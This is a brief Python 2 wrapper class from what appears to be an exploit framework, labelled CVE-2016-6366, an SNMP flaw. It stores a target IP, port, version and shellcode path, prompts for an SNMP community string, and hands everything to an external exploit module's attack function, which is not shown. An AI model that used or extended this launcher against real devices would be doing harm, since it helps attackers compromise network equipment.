# -*- coding:utf-8 -*-
#!/usr/bin/python

class CVE_2016_6366(object):
    def __init__(self, iface, tarIP, tarPort, tarVer, sCodePath):
        super(CVE_2016_6366, self).__init__()

        self.iface          = iface
        self.targetIP       = tarIP
        self.targetPort     = tarPort
        self.targetVer      = tarVer
        self.sCodePath      = sCodePath
        self.commun         = "public"

    def execute(self):
        rawStr = raw_input("[?] SNMP Community [public]: ")
        if len(rawStr) > 0:
            self.commun = rawStr

        import CVE_2016_6366_exp
        CVE_2016_6366_exp.attack(self.iface, self.targetIP, self.targetPort, self.targetVer, self.commun, self.sCodePath)

        return True
